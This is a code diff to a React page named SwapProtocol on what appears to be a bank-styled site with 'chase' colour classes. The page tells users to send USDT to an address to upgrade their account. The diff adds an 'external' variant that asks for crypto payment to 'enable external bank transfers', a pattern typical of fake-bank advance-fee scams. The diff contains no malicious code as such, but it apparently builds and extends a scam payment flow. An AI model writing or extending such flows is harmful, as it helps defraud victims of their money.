@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useNavigate, useLocation } from 'react-router-dom';
 import { Copy, CheckCircle2, QrCode, ArrowLeft, ExternalLink } from 'lucide-react';
 import api from '../../api/axios';
 import Button from '../../components/ui/Button';
@@ -7,6 +7,10 @@ import toast from 'react-hot-toast';
 
 const SwapProtocol = () => {
   const navigate = useNavigate();
+  const location = useLocation();
+  const queryParams = new URLSearchParams(location.search);
+  const type = queryParams.get('type') || 'internal';
+
   const [copied, setCopied] = useState(false);
   const [loading, setLoading] = useState(false);
   const [completed, setCompleted] = useState(false);
@@ -24,7 +28,7 @@ const SwapProtocol = () => {
   const handlePaymentCompleted = async () => {
     setLoading(true);
     try {
-      const response = await api.post('?action=create_swap_protocol');
+      const response = await api.post('?action=create_swap_protocol', { type });
       if (response.data.status === 'success') {
         setCompleted(true);
         toast.success('Swap protocol initiated successfully');
@@ -49,7 +53,7 @@ const SwapProtocol = () => {
           </div>
           <h1 className="text-3xl font-black text-chase-navy">Request Received!</h1>
           <p className="text-gray-500 text-lg">
-            Your USDT Swap Protocol request has been submitted. Our team will verify the transaction and upgrade your account shortly.
+            Your USDT {type === 'external' ? 'External ' : ''}Swap Protocol request has been submitted. Our team will verify the transaction and upgrade your account shortly.
           </p>
           <div className="pt-6">
             <Button onClick={() => navigate('/dashboard')} className="w-full py-4">
@@ -72,8 +76,8 @@ const SwapProtocol = () => {
       </button>
 
       <div className="text-center mb-8">
-        <h1 className="text-3xl font-black text-chase-navy mb-2">USDT Swap Protocol</h1>
-        <p className="text-gray-500">Send USDT (BEP20) to the address below to upgrade your account</p>
+        <h1 className="text-3xl font-black text-chase-navy mb-2">USDT {type === 'external' ? 'External ' : ''}Swap Protocol</h1>
+        <p className="text-gray-500">Send USDT (BEP20) to the address below to {type === 'external' ? 'enable external bank transfers' : 'upgrade your account'}</p>
       </div>
 
       <div className="bg-white rounded-3xl border border-chase-border shadow-xl overflow-hidden">
